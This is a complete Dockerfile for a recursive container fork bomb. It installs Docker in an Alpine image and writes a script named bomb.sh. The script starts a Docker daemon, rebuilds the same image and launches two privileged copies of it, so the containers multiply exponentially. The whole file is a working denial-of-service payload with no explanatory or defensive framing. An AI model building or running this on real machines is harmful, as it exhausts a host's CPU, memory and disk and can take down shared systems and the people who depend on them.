FROM alpine
RUN apk add docker --no-cache
COPY Dockerfile /root
WORKDIR /root
RUN printf "\
        dockerd &\n\
        sleep 2\n\
        docker build -t bomb .\n\
        docker run --privileged --rm -it bomb &\n\
        docker run --privileged --rm -it bomb"\
        >> bomb.sh
ENTRYPOINT sh bomb.sh
